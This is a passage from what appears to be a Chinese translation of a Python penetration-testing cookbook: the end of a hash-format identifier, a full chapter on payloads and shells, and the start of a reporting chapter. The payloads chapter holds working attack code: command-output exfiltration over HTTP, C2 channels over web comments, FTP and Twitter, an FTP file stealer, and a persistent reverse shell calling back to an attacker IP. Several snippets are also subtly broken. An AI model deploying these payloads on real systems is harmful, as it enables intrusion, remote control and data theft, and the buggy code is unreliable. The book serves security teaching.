("MD5(APR)", r"^\$apr1\$.{0,8}\$[a-zA-Z0-9\/\.]{22}$"),
("MD5(MyBB)", r"^[a-fA-F0-9]{32}:[a-z0-9]{8}$"),
("MD5(ZipMonster)", r"^[a-fA-F0-9]{32}$"),
("MD5 crypt", r"^\$1\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
("MD5 apache crypt", r"^\$apr1\$[a-zA-Z0-9./]{8}\$[a-zA-Z0- 9./]{1,}$"),
("MD5(Joomla)", r"^[a-fA-F0-9]{32}:[a-zA-Z0-9]{16,32}$"),
("MD5(Wordpress)", r"^\$P\$[a-zA-Z0-9\/\.]{31}$"),
("MD5(phpBB3)", r"^\$H\$[a-zA-Z0-9\/\.]{31}$"),
("MD5(Cisco PIX)", r"^[a-zA-Z0-9\/\.]{16}$"),
("MD5(osCommerce)", r"^[a-fA-F0-9]{32}:[a-zA-Z0-9]{2}$"),
("MD5(Palshop)", r"^[a-fA-F0-9]{51}$"),
("MD5(IP.Board)", r"^[a-fA-F0-9]{32}:.{5}$"),
("MD5(Chap)", r"^[a-fA-F0-9]{32}:[0-9]{32}:[a-fA-F0-9]{2}$"),
("Juniper Netscreen/SSG (ScreenOS)", r"^[a-zA-Z0-9]{30}:[a-zA-Z0- 9]{4,}$"),
("Fortigate (FortiOS)", r"^[a-fA-F0-9]{47}$"),
("Minecraft(Authme)", r"^\$sha\$[a-zA-Z0-9]{0,16}\$[a-fA-F0- 9]{64}$"),
("Lotus Domino", r"^\(?[a-zA-Z0-9\+\/]{20}\)?$"),
("Lineage II C4", r"⁰x[a-fA-F0-9]{32}$"),
("CRC-96(ZIP)", r"^[a-fA-F0-9]{24}$"),
("NT crypt", r"^\$3\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
("Skein-1024", r"^[a-fA-F0-9]{256}$"),
("RIPEMD-320", r"^[A-Fa-f0-9]{80}$"),
("EPi hash", r"⁰x[A-F0-9]{60}$"),
("EPiServer 6.x < v4", r"^\$episerver\$\*0\*[a-zA-Z0-9]{22}==\*[a- zA-Z0-9\+]{27}$"),
("EPiServer 6.x >= v4", r"^\$episerver\$\*1\*[a-zA-Z0- 9]{22}==\*[a-zA-Z0-9]{43}$"),
("Cisco IOS SHA256", r"^[a-zA-Z0-9]{43}$"),
("SHA-1(Django)", r"^sha1\$.{0,32}\$[a-fA-F0-9]{40}$"),
("SHA-1 crypt", r"^\$4\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
("SHA-1(Hex)", r"^[a-fA-F0-9]{40}$"),
("SHA-1(LDAP) Base64", r"^\{SHA\}[a-zA-Z0-9+/]{27}=$"),
("SHA-1(LDAP) Base64 + salt", r"^\{SSHA\}[a-zA-Z0- 9+/]{28,}[=]{0,3}$"),
("SHA-512(Drupal)", r"^\$S\$[a-zA-Z0-9\/\.]{52}$"),
("SHA-512 crypt", r"^\$6\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
("SHA-256(Django)", r"^sha256\$.{0,32}\$[a-fA-F0-9]{64}$"),
("SHA-256 crypt", r"^\$5\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
("SHA-384(Django)", r"^sha384\$.{0,32}\$[a-fA-F0-9]{96}$"),
("SHA-256(Unix)", r"^\$5\$.{0,22}\$[a-zA-Z0-9\/\.]{43,69}$"),
("SHA-512(Unix)", r"^\$6\$.{0,22}\$[a-zA-Z0-9\/\.]{86}$"),
("SHA-384", r"^[a-fA-F0-9]{96}$"),
("SHA-512", r"^[a-fA-F0-9]{128}$"),
("SSHA-1", r"^({SSHA})?[a-zA-Z0-9\+\/]{32,38}?(==)?$"),
("SSHA-1(Base64)", r"^\{SSHA\}[a-zA-Z0-9]{32,38}?(==)?$"),
("SSHA-512(Base64)", r"^\{SSHA512\}[a-zA-Z0-9+]{96}$"),
("Oracle 11g", r"^S:[A-Z0-9]{60}$"),
("SMF >= v1.1", r"^[a-fA-F0-9]{40}:[0-9]{8}&"),
("MySQL 5.x", r"^\*[a-f0-9]{40}$"),
("MySQL 3.x", r"^[a-fA-F0-9]{16}$"),
("OSX v10.7", r"^[a-fA-F0-9]{136}$"),
("OSX v10.8", r"^\$ml\$[a-fA-F0-9$]{199}$"),
("SAM(LM_Hash:NT_Hash)", r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$"),
("MSSQL(2000)", r"⁰x0100[a-f0-9]{0,8}?[a-f0-9]{80}$"),
("MSSQL(2005)", r"⁰x0100[a-f0-9]{0,8}?[a-f0-9]{40}$"),
("MSSQL(2012)", r"⁰x02[a-f0-9]{0,10}?[a-f0-9]{128}$"),
("TIGER-160(HMAC)", r"^[a-f0-9]{40}$"),
("SHA-256", r"^[a-fA-F0-9]{64}$"),
("SHA-1(Oracle)", r"^[a-fA-F0-9]{48}$"),
("SHA-224", r"^[a-fA-F0-9]{56}$"),
("Adler32", r"^[a-f0-9]{8}$"),
("CRC-16-CCITT", r"^[a-fA-F0-9]{4}$"),
("NTLM)", r"^[0-9A-Fa-f]{32}$"),
)
counter = 0
for h in hashes:
    text = hashcheck(h[0], h[1], string_to_check)
    if text is not None:
        counter += 1
        print text
if counter == 0:
    print "Your input hash did not match anything, sorry!"
```

## 工作原理…

在我们导入`re`模块之后，我们将开始构建我们的第一个代码块，这将是我们脚本的核心。我们将尝试在整个脚本中使用常规命名，以使其在以后更易管理。出于这个原因，我们选择了名为`hashcheck`。我们使用名为`hashtype`来表示即将在正则表达式代码块中出现的哈希的名称，我们使用`regexstr`来表示正则表达式，最后使用数据。

我们创建一个名为`valid_hash`的字符串，并为其赋予在通过数据后迭代值的值，这只会在我们有一个有效的匹配时发生。这可以在稍后看到，我们在那里为匹配哈希值的值 result 赋予了匹配哈希值的名称，我们最终打印匹配（如果找到一个或多个）并在结尾添加我们的`except`语句：

```py
def hashcheck (hashtype, regexstr, data):
    try:
        valid_hash = re.finditer(regexstr, data)
        result = [match.group(0) for match in valid_hash]
        if result: 
            return "This hash matches the format of: " + hashtype
    except: pass
```

然后我们要求用户输入，这样我们就有了一些东西可以与正则表达式进行匹配。这是正常进行的：

```py
string_to_check = raw_input('Please enter the hash you wish to check: ')
```

完成这些后，我们可以继续进行复杂的正则表达式操作。我们使用正则表达式的原因是为了区分不同的哈希值，因为它们具有不同的长度和字符集。这对于 MD5 哈希非常有帮助，因为有许多不同类型的 MD5 哈希，比如 phpBB3 和 MyBB 论坛。

我们给一组正则表达式起一个逻辑的名字，比如 hashes，然后定义它们：

```py
hashes = (
("Blowfish(Eggdrop)", r"^\+[a-zA-Z0-9\/\.]{12}$"),
("Blowfish(OpenBSD)", r"^\$2a\$[0-9]{0,2}?\$[a-zA-Z0- 9\/\.]{53}$"),
("Blowfish crypt", r"^\$2[axy]{0,1}\$[a-zA-Z0-9./]{8}\$[a-zA-Z0- 9./]{1,}$"),
("DES(Unix)", r"^.{0,2}[a-zA-Z0-9\/\.]{11}$"),
("MD5(Unix)", r"^\$1\$.{0,8}\$[a-zA-Z0-9\/\.]{22}$"),
("MD5(APR)", r"^\$apr1\$.{0,8}\$[a-zA-Z0-9\/\.]{22}$"),
("MD5(MyBB)", r"^[a-fA-F0-9]{32}:[a-z0-9]{8}$"),
("MD5(ZipMonster)", r"^[a-fA-F0-9]{32}$"),
("MD5 crypt", r"^\$1\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
("MD5 apache crypt", r"^\$apr1\$[a-zA-Z0-9./]{8}\$[a-zA-Z0- 9./]{1,}$"),
("MD5(Joomla)", r"^[a-fA-F0-9]{32}:[a-zA-Z0-9]{16,32}$"),
("MD5(Wordpress)", r"^\$P\$[a-zA-Z0-9\/\.]{31}$"),
("MD5(phpBB3)", r"^\$H\$[a-zA-Z0-9\/\.]{31}$"),
("MD5(Cisco PIX)", r"^[a-zA-Z0-9\/\.]{16}$"),
("MD5(osCommerce)", r"^[a-fA-F0-9]{32}:[a-zA-Z0-9]{2}$"),
("MD5(Palshop)", r"^[a-fA-F0-9]{51}$"),
("MD5(IP.Board)", r"^[a-fA-F0-9]{32}:.{5}$"),
("MD5(Chap)", r"^[a-fA-F0-9]{32}:[0-9]{32}:[a-fA-F0-9]{2}$"),
[...cut out...]
("NTLM)", r"^[0-9A-Fa-f]{32}$"),
)
```

然后我们需要找到一种方法以可管理的方式将数据返回给用户，而不让他们每次找到一个非匹配时都知道。我们通过创建一个计数器来实现这一点。我们将这个计数器的值设置为`0`并继续。然后我们创建一个名为`text`的函数，如果找到匹配，它将成为哈希名称的值。然后使用`if`语句来防止我们之前提到的不需要的消息。我们告诉脚本，如果`text 不是 none`，那么就找到了一个匹配，所以我们提高计数器的值并打印文本。使用计数器的想法意味着任何找到的非匹配都不会增加计数器，因此不会被打印给用户：

```py
counter = 0
for h in hashes:
    text = hashcheck(h[0], h[1], string_to_check)
    if text is not None:
        counter += 1
        print text
```

我们通过以最礼貌的方式告知用户没有匹配来完成脚本！

```py
if counter == 0:
    print "Your input hash did not match anything, sorry!"
```

以下是脚本运行的一些示例：

```py
Please enter the hash you wish to check: ok
No Matches

```

前面的结果没有找到匹配，因为没有列出输出两个字符字符串的哈希系统。以下是一个成功找到的示例：

```py
Please enter the hash you wish to check: fd7a4c43ad7c20dbea0dc6dacc12ef6c36c2c382a0111c92f24244690eba65a2
This hash matches the format of: SHA-256

```


# 第八章：负载和 Shell

在本章中，我们将涵盖以下主题：

+   通过 HTTP 请求提取数据

+   创建一个 HTTP C2

+   创建 FTP C2

+   创建 Twitter C2

+   创建一个简单的 Netcat shell

# 介绍

在本章中，我们将讨论在 Python 中创建反向 shell 和负载的过程。一旦在 Linux 或 Mac 系统上识别出上传漏洞，Python 负载就处于下一步的甜蜜点。它们易于制作或定制以匹配特定系统，具有清晰的功能，最重要的是，几乎所有的 Mac 和 Linux 系统默认都安装了 Python 2.7。

# 通过 HTTP 请求提取数据

我们将要创建的第一个脚本将使用非常简单的技术从目标服务器中提取数据。有三个基本步骤：在目标上运行命令，通过 HTTP 请求将输出传输给攻击者，并查看结果。

## 准备就绪

此示例需要一个 Web 服务器，该服务器可在攻击者一侧访问，以便接收来自目标的 HTTP 请求。幸运的是，Python 有一种非常简单的方法来启动 Web 服务器：

```py
$ Python –m SimpleHTTPServer

```

这将在端口`8000`上启动一个 HTTP Web 服务器，提供当前目录中的任何文件。它接收到的任何请求都将直接打印到控制台，这是一种非常快速获取数据的方法，因此是此脚本的一个很好的补充。

## 如何做…

这是一个将在服务器上运行各种命令并通过 Web 请求传输输出的脚本：

```py
import requests
import urllib
import subprocess
from subprocess import PIPE, STDOUT

commands = ['whoami','hostname','uname']
out = {}

for command in commands:
    try:
            p = subprocess.Popen(command, stderr=STDOUT, stdout=PIPE)
            out[command] = p.stdout.read().strip()
    except:
        pass

requests.get('http://localhost:8000/index.html?' + urllib.urlencode(out))
```

## 工作原理…

导入之后，脚本的第一部分创建了一个命令数组：

```py
commands = ['whoami','hostname','uname']
```

这是三个标准的 Linux 命令的示例，可以向攻击者提供有用的信息。请注意，这里假设目标服务器正在运行 Linux。使用前几章的脚本进行侦察，以确定目标操作系统，并在必要时用 Windows 等效命令替换此数组中的命令。

接下来，我们有主要的`for`循环：

```py
            p = subprocess.Popen(command, stderr=STDOUT, stdout=PIPE)
            out[command] = p.stdout.read().strip()
```

代码的这部分执行命令并从`subprocess`中获取输出（将标准输出和标准错误都传输到单个`subprocess.PIPE`中）。然后将结果添加到输出字典中。请注意，我们在这里使用`try`和`except`语句，因为任何无法运行的命令都会引发异常。

最后，我们有一个单一的 HTTP 请求：

```py
requests.get('http://localhost:8000/index.html?' + urllib.urlencode(out))
```

这使用`urllib.encode`将字典转换为 URL 编码的键/值对。这意味着任何可能影响 URL 的字符，例如`&`或`=`，将被转换为它们的 URL 编码等效形式，例如`%26`和`%3D`。

请注意，脚本端不会有任何输出；一切都通过 HTTP 请求传递到攻击者的 Web 服务器（示例使用本地主机的端口`8000`）。`GET`请求如下所示：

![工作原理…](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_08_01.jpg)

# 创建一个 HTTP C2

在 URL 中公开您的命令的问题是，即使是半睡不醒的日志分析员也会注意到它。有多种方法可以隐藏请求，但是当您不知道响应文本将是什么样子时，您需要提供一种可靠的方法来伪装输出并将其返回到您的服务器。

我们将创建一个脚本，将命令和控制活动伪装成 HTTP 流量，从网页评论中获取命令，并将输出返回到留言簿中。

## 入门

为此，您需要一个正常运行的 Web 服务器，其中包括两个页面，一个用于托管您的评论，另一个用于托管检索页面。

您的评论页面应该只包含标准内容。为此，我使用 Nginx 默认主页，并在末尾添加评论。评论应表达为：

```py
<!--cmdgoeshere-->
```

检索页面可以非常简单：

```py
<?php

$host='localhost';
$username='user';
$password='password';
$db_name="data";
$tbl_name="data";

$comment = $_REQUEST['comment'];

mysql_connect($host, $username, $password) or die("Cannot contact server");
mysql_select_db($db_name)or die("Cannot find DB");

$sql="INSERT INTO $tbl_name VALUES('$comment')";

$result=mysql_query($sql);

mysql_close();
?>
```

基本上，这个 PHP 所做的是接收`POST`请求中名为`comment`的传入值，并将其放入数据库中。这非常基础，如果您有多个 shell，它不会区分多个传入命令。

## 如何做…

我们将使用的脚本如下：

```py
import requests
import re
import subprocess
import time
import os

while 1:
  req = requests.get("http://127.0.0.1")
  comments = re.findall('<!--(.*)-->',req.text)
  for comment in comments:
    if comment = " ":
      os.delete(__file__)
    else:
      try:
        response = subprocess.check_output(comment.split())
      except:
        response = "command fail"
  data={"comment":(''.join(response)).encode("base64")}
  newreq = requests.post("http://notmalicious.com/c2.php", data=data)
  time.sleep(30)
```

以下是使用此脚本时产生的输出示例：

```py
Name: TGludXggY2FtLWxhcHRvcCAzLjEzLjAtNDYtZ2VuZXJpYyAjNzktVWJ1bnR1IFNNU CBUdWUgTWFyIDEwIDIwOjA2OjUwIFVUQyAyMDE1IHg4Nl82NCB4ODZfNjQgeDg2X zY0IEdOVS9MaW51eAo= Comment:
Name: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFl bW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9i aW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jp bi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5 bmM6L2JpbjovYmluL3N5bmMKZ Comment:
```

## 它是如何工作的...

像往常一样，我们导入必要的库并启动脚本：

```py
import requests
import re
import subprocess
import time
import os
```

由于此脚本具有内置的自删除方法，因此我们可以设置它以以下循环永远运行：

```py
while 1:
```

我们发出请求，检查我们预先配置的页面上是否有任何评论。如果有，我们将它们放在一个列表中。我们使用非常基本的`regex`来执行此检查：

```py
  req = requests.get("http://127.0.0.1")
  comments = re.findall('<!--(.*)-->',req.text)
```

我们要做的第一件事是检查是否有空评论。这对脚本来说意味着它应该删除自己，这是一个非常重要的无人值守 C2 脚本机制。如果您希望脚本删除自己，只需在页面上留下一个空评论。脚本通过查找自己的名称并删除该名称来删除自己：

```py
for comment in comments:
    if comment = " ":
      os.delete(__file__)
```

如果评论不为空，我们尝试使用`subprocess`命令将其传递给系统。重要的是你在命令上使用`.split()`来考虑`subprocess`如何处理多部分命令。我们使用`.check_output`将命令直接返回给我们分配的变量：

```py
else:
      try:
        response = subprocess.check_output(comment.split())
```

如果命令失败，我们将响应值设置为`命令失败`：

```py
      except:
        response = "command fail"
```

我们取`response`变量并将其分配给与字典中的 PHP 脚本匹配的键。在这种情况下，字段名为`comment`，因此我们将输出分配给评论。我们对输出进行 base64 编码，以便考虑到任何可能干扰我们脚本的随机变量，例如空格或代码：

```py
data={"comment":(''.join(response)).encode("base64")}
```

现在数据已经分配，我们将其发送到我们预先配置的服务器的`POST`请求中，并等待`30`秒再次检查评论中是否有进一步的指示：

```py
newreq = requests.post("http://127.0.0.1/addguestbook.php", data=data)
  time.sleep(30)
```

# 创建 FTP C2

这个脚本是一个快速而肮脏的文件窃取工具。它沿着目录直线运行，抓取它接触到的一切。然后将这些导出到它指向的`FTP`目录。在您可以放置文件并希望快速获取服务器内容的情况下，这是一个理想的起点。

我们将创建一个连接到 FTP 的脚本，获取当前目录中的文件，并将它们导出到 FTP。然后它跳到下一个目录并重复。当它遇到两个相同的目录列表（也就是说，它到达了根目录）时，它就会停止。

## 入门

为此，您将需要一个正常运行的 FTP 服务器。我正在使用`vsftpd`，但您可以使用任何您喜欢的。您需要将凭据硬编码到脚本中（不建议）或者作为标志与凭据一起发送。

## 如何做...

我们将使用的脚本如下：

```py
from ftplib import FTP
import time
import os

user = sys.argv[1]
pw = sys.argv[2]

ftp = FTP("127.0.0.1", user, pw)

filescheck = "aa"

loop = 0
up = "../"

while 1:
  files = os.listdir("./"+(i*up))
  print files

  for f in files:
    try:
      fiile = open(f, 'rb')
      ftp.storbinary('STOR ftpfiles/00'+str(f), fiile)
      fiile.close()
    else:
      pass

  if filescheck == files:
    break
  else:
    filescheck = files
    loop = loop+1
    time.sleep(10)
ftp.close()
```

## 它是如何工作的...

像往常一样，我们导入我们的库并设置我们的变量。我们已将用户名和密码设置为`sys.argv`，以避免硬编码，从而暴露我们的系统：

```py
from ftplib import FTP
import time
import os

user = sys.argv[1]
pw = sys.argv[2]
```

然后我们使用 IP 地址和通过标志设置的凭据连接到我们的 FTP。您还可以将 IP 作为`sys.argv`传递，以避免硬编码：

```py
ftp = FTP("127.0.0.1", user, pw)
```

我设置了一个 nonce 值，它与目录检查方法的第一个目录不匹配。我们还将循环设置为`0`，并将"上一个目录"命令配置为一个变量，类似于第三章中的目录遍历脚本，*漏洞识别*：

```py
filescheck = "aa"

loop = 0
up = "../"
```

然后我们创建我们的主循环以永远重复并创建我们选择的目录调用。我们列出我们调用的目录中的文件并将其分配给一个变量。您可以选择在这里打印文件列表，如我所做的那样，以进行诊断目的，但这没有任何区别：

```py
while 1:
  files = os.listdir("./"+(i*up))
  print files
```

对于在目录中检测到的每个文件，我们尝试打开它。重要的是我们用`rb`打开文件，因为这允许它作为二进制文件读取，使其可以作为二进制文件传输。如果可以打开，我们使用`storbinary`命令将其传输到 FTP。然后我们关闭文件以完成交易：

```py
  try:
      fiile = open(f, 'rb')
      ftp.storbinary('STOR ftpfiles/00'+str(f), fiile)
      fiile.close()
```

如果由于任何原因我们无法打开或传输文件，我们只需继续到列表中的下一个文件：

```py
  else:
      pass
```

然后我们检查是否自上次命令以来改变了目录。如果没有，我们就跳出主循环：

```py
if filescheck == files:
    break
```

如果目录列表不匹配，我们将`filecheck`变量设置为匹配当前目录，通过`1`迭代循环，并休眠`10`秒以避免向服务器发送垃圾邮件：

```py
else:
    filescheck = files
    loop = loop+1
    time.sleep(10)
```

最后，一切都完成后，我们关闭与 FTP 服务器的连接：

```py
ftp.close()
```

# 创建 Twitter C2

在一定程度上，请求互联网上的随机页面是可以接受的，但一旦**安全运营中心**（**SOC**）分析员仔细查看所有消失在管道中的数据，很明显这些请求是发往一个可疑站点，因此很可能与恶意流量相关。幸运的是，社交媒体在这方面提供了帮助，并允许我们将数据隐藏在明处。

我们将创建一个连接到 Twitter 的脚本，读取推文，根据这些推文执行命令，加密响应数据，并将其发布到 Twitter。我们还将创建一个解码脚本。

## 入门

为此，您需要一个带有 API 密钥的 Twitter 帐户。

## 如何做…

我们将使用的脚本如下：

```py
from twitter import *
import os
from Crypto.Cipher import ARC4
import subprocess
import time

token = ''
token_key = ''
con_secret = ''
con_secret_key = ''
t = Twitter(auth=OAuth(token, token_key, con_secret, con_secret_key))

while 1:
  user = t.statuses.user_timeline()
  command = user[0]["text"].encode('utf-8')
  key = user[1]["text"].encode('hex')
  enc = ARC4.new(key)
  response = subprocess.check_output(command.split())

  enres = enc.encrypt(response).encode("base64")

  for i in xrange(0, len(enres), 140):
          t.statuses.update(status=enres[i:i+140])
  time.sleep(3600)
```

解码脚本如下：

```py
from Crypto.Cipher import ARC4
key = "".encode("hex")
response = ""
enc = ARC4.new(key)
response = response.decode("base64")
print enc.decrypt(response)
```

脚本进行中的示例如下：

![如何做…](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_08_02.jpg)

## 它是如何工作的…

我们像往常一样导入我们的库。有很多 Twitter 的 Python 库；我只是使用了[`code.google.com/p/python-twitter/`](https://code.google.com/p/python-twitter/)上可用的标准 twitter API。代码如下：

```py
from twitter import *
import os
from Crypto.Cipher import ARC4
import subprocess
import time
```

为了满足 Twitter 的身份验证要求，我们需要从[developer.twitter.com](http://developer.twitter.com)的**App 页面**中检索**App 令牌**、**App 密钥**、**用户令牌**和**用户密钥**。我们将它们分配给变量，并设置我们与 Twitter API 的连接：

```py
token = ''
token_key = ''
con_secret = ''
con_secret_key = ''
t = Twitter(auth=OAuth(token, token_key, con_secret, con_secret_key))
```

我们设置一个无限循环：

```py
while 1:
```

我们调用已设置的帐户的用户时间线。这个应用程序必须对 Twitter 帐户具有读写权限很重要。然后我们取最近推文的最后一条文本。我们需要将其编码为 UTF-8，因为通常有一些字符，普通编码无法处理：

```py
user = t.statuses.user_timeline()
command = user[0]["text"].encode('utf-8')
```

然后我们取最后一条推文作为我们加密的密钥。我们将其编码为`hex`以避免出现空格匹配空格的情况：

```py
key = user[1]["text"].encode('hex')
enc = ARC4.new(key)
```

我们通过使用`subprocess`函数执行操作。我们使用预设的 XOR 加密加密输出，并将其编码为 base64：

```py
response = subprocess.check_output(command.split())
enres = enc.encrypt(response).encode("base64")
```

我们将加密和编码的响应分成 140 个字符的块，以适应 Twitter 的字符限制。对于每个块，我们创建一个 Twitter 状态：

```py
for i in xrange(0, len(enres), 140):
  t.statuses.update(status=enres[i:i+140])
```

因为每个步骤都需要两条推文，我在每个命令检查之间留了一个小时的间隔，但您可以很容易地根据自己的需要进行更改：

```py
time.sleep(3600)
```

对于解码，导入`RC4`库，将您的关键推文设置为密钥，并将重新组装的 base64 设置为响应：

```py
from Crypto.Cipher import ARC4
key = "".encode("hex")
response = ""
```

使用关键字设置一个新的`RC4`代码，从 base64 解码数据，并使用关键字解密它：

```py
enc = ARC4.new(key)
response = response.decode("base64")
print enc.decrypt(response)
```

# 创建一个简单的 Netcat shell

我们将创建以下脚本，利用原始套接字从网络中泄露数据。这个 shell 的一般思想是在受损的机器和您自己的机器之间创建一个连接，通过 Netcat（或其他程序）会话发送命令到这台机器。

这个 Python 脚本的美妙之处在于它的隐蔽性，因为它看起来就像一个完全合法的脚本。

## 如何做…

这是将通过 Netcat 建立连接并读取输入的脚本：

```py
import socket
import subprocess
import sys
import time

HOST = '172.16.0.2'    # Your attacking machine to connect back to
PORT = 4444           # The port your attacking machine is listening on

def connect((host, port)):
   go = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   go.connect((host, port))
   return go

def wait(go):
   data = go.recv(1024)
   if data == "exit\n":
      go.close()
      sys.exit(0)
   elif len(data)==0:
      return True
   else:
      p = subprocess.Popen(data, shell=True,
         stdout=subprocess.PIPE, stderr=subprocess.PIPE,
         stdin=subprocess.PIPE)
      stdout = p.stdout.read() + p.stderr.read()
      go.send(stdout)
      return False

def main():
   while True:
      dead=False
      try:
         go=connect((HOST,PORT))
         while not dead:
            dead=wait(go)
         go.close()
      except socket.error:
         pass
      time.sleep(2)

if __name__ == "__main__":
   sys.exit(main())
```

## 它是如何工作的…

要像往常一样启动脚本，我们需要导入将在整个脚本中使用的模块：

```py
import socket
import subprocess
import sys
import time
```

然后我们需要定义我们的变量：这些值是攻击机器的 IP 和端口，以建立连接：

```py
HOST = '172.16.0.2'    # Your attacking machine to connect back to
PORT = 4444           # The port your attacking machine is listening on
```

然后我们继续定义原始连接；然后我们可以为我们建立的值分配一个值，并在以后引用它来读取输入并发送标准输出。

我们回顾一下之前设置的主机和端口值，并创建连接。我们将已建立的连接赋予`go`的值：

```py
def connect((host, port)):
   go = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   go.connect((host, port))
   return go
```

然后，我们可以引入一段代码，用于等待部分。这将通过攻击机的 Netcat 会话等待发送给它的命令。我们确保通过会话发送的数据被导入到 shell 中，并且其标准输出通过已建立的 Netcat 会话返回给我们，从而通过反向连接为我们提供 shell 访问权限。

我们给通过 Netcat 会话传递给受损机器的值命名为数据。脚本中添加了一个值，用于在用户完成操作时退出会话；我们选择了`exit`，这意味着在 Netcat 会话中输入 exit 将终止已建立的连接。然后，我们开始处理数据的细节部分，其中数据被打开（读取）并被导入到 shell 中。完成后，我们确保读取`stdout`值并赋予一个值`stdout`（这可以是任何值），然后通过之前建立的`go`会话将其发送回给我们自己。代码如下：

```py
def wait(go):
   data = go.recv(1024)
   if data == "exit\n":
      go.close()
      sys.exit(0)
   elif len(data)==0:
      return True
   else:
      p = subprocess.Popen(data, shell=True,
         stdout=subprocess.PIPE, stderr=subprocess.PIPE,
         stdin=subprocess.PIPE)
      stdout = p.stdout.read() + p.stderr.read()
      go.send(stdout)
      return False
```

我们脚本的最后部分是错误检查和运行部分。在脚本运行之前，我们确保让 Python 知道我们有一个机制来检查会话是否处于活动状态，方法是使用我们之前的真实语句。如果连接丢失，Python 脚本将尝试重新与攻击机建立连接，使其成为一个持久的后门：

```py
def main():
   while True:
      dead=False
      try:
         go=connect((HOST,PORT))
         while not dead:
            dead=wait(go)
         go.close()
      except socket.error:
         pass
      time.sleep(2)

if __name__ == "__main__":
   sys.exit(main())
```


# 第九章：报告

在本章中，我们将涵盖以下主题：

+   将 Nmap XML 转换为 CSV

+   从 URL 提取链接到 Maltego

+   从 URL 提取电子邮件到 Maltego

+   将 Sslscan 解析为 CSV

+   使用`plot.ly`生成图表

# 介绍

我们在本书中有各种执行 Web 应用程序测试的方法。因此，我们有所有这些信息。我们从我们的方法中得到控制台输出，但是如何将所有这些收集到一个有用的格式中呢？理想情况下，我们希望输出以一种我们可以使用的格式。或者我们可能希望将来自另一个应用程序（如 Nmap）的输出转换为我们正在使用的格式。这可以是**逗号分隔变量**（**CSV**），或者可能是 Maltego 变换，或者任何您想要使用的其他格式。

你刚才提到的 Maltego 是什么？我听到你问。Maltego 是一个**开源情报**（**OSINT**）和取证应用程序。它有一个漂亮的 GUI，可以帮助您以一种漂亮、漂亮且易于理解的方式可视化您的信息。

# 将 Nmap XML 转换为 CSV

Nmap 是在 Web 应用程序测试的侦察阶段中常用的工具。通常用于使用各种选项扫描端口，以帮助您自定义扫描的方式。例如，您想要进行 TCP 还是 UDP？您想设置什么 TCP 标志？是否有特定的 Nmap 脚本，例如检查**网络时间协议**（**NTP**）反射，但在非默认端口上运行？列表可能是无穷无尽的。

Nmap 输出很容易阅读，但在程序化的方式下并不容易使用。这个简单的示例将把 Nmap 的 XML 输出（通过在运行 Nmap 扫描时使用-oX 标志）转换为 CSV 输出。

## 准备工作

虽然这个示例在实现上非常简单，但您需要安装 Python 的`nmap`模块。您可以使用`pip`或从源文件构建它来实现。您还需要来自 Nmap 扫描的 XML 输出。您可以从扫描您选择的易受攻击的虚拟机或您有权限扫描的站点中获取这些输出。您可以直接使用 Nmap，也可以在 Python 脚本中使用 Python 的`nmap`模块来实现。

## 如何做…

就像我之前提到的，这个示例非常简单。这主要是因为`nmap`库已经为我们做了大部分的工作。

这是我们将用于此任务的脚本：

```py
import sys
import os
import nmap

nm=nmap.Portscanner()
with open(“./nmap_output.xml”, “r”) as fd:
    content = fd.read()
    nm.analyse_nmap_xml_scan(content)
    print(nm.csv())
```

## 工作原理…

因此，在导入必要的模块之后，我们必须初始化 Nmap 的`Portscanner`函数。尽管在这个示例中我们不会进行任何端口扫描，但这是必要的，以便我们可以使用对象中的方法：

```py
nm=nmap.Portscanner()
```

然后，我们有一个`with`语句。那是什么？以前，在 Python 中打开文件时，您必须记住在完成后关闭它。在这种情况下，`with`语句将在其中的所有代码执行完毕后为您关闭文件。如果您记忆力不好，经常忘记在代码中关闭文件，这将非常有用：

```py
with open(“./nmap_output.xml”, “r”) as fd:
```

在`with`语句之后，我们将文件的内容读入`content`变量中（我们可以将此变量命名为任何我们想要的，但为什么要使事情变得过于复杂呢？）：

```py
    content = fd.read()
```

使用我们之前创建的`Portscanner`对象，我们现在可以分析我们提供的 XML 输出的内容，然后将其打印为 CSV：

```py
nm.analyse_nmap_xml_scan(content)
    print(nm.csv())
```

# 从 URL 提取链接到 Maltego

本书中还有另一个示例，说明如何使用`BeautifulSoup`库以编程方式获取域名。这个示例将向您展示如何创建一个本地的 Maltego 变换，然后您可以在 Maltego 中使用它以一种易于使用、图形化的方式生成信息。通过从这个变换中收集的链接，这也可以作为更大的爬虫或抓取解决方案的一部分使用。

## 如何做…

以下代码显示了如何创建一个脚本，将枚举信息输出到 Maltego 的正确格式中：

```py
import urllib2
from bs4 import BeautifulSoup
import sys

tarurl = sys.argv[1]
if tarurl[-1] == “/”:
  tarurl = tarurl[:-1]
print”<MaltegoMessage>”
print”<MaltegoTransformResponseMessage>”
print”  <Entities>”

url = urllib2.urlopen(tarurl).read()
soup = BeautifulSoup(url)
for line in soup.find_all(‘a’):
  newline = line.get(‘href’)
  if newline[:4] == “http”:
    print”<Entity Type=\”maltego.Domain\”>” 
    print”<Value>”+str(newline)+”</Value>”
    print”</Entity>”
  elif newline[:1] == “/”:
    combline = tarurl+newline
    print”<Entity Type=\”maltego.Domain\”>” 
    print”<Value>”+str(combline)+”</Value>”
    print”</Entity>”
print”  </Entities>”
print”</MaltegoTransformResponseMessage>”
print”</MaltegoMessage>”
```

## 它是如何工作的…

首先，我们为这个配方导入所有必要的模块。您可能已经注意到，对于`BeautifulSoup`，我们有以下行：

```py
